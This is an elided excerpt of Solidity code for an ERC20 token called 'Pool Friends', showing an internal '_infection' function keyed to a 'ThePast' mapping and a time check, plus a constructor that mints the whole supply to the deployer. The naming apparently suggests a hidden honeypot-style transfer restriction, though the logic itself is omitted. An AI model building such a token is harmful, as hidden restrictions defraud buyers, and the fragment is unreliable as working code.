...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _infection(address sender, uint256 amount, uint256 time) internal {
        ...
        if ((ThePast[sender] == false) && (getTimeDifference >= 0)) {
...
contract PoolFriends is ERC20Token {
    constructor() ERC20Token("Pool Friends", "PoolFriends", msg.sender, 1000000000 * 10 ** 18) {
    }
}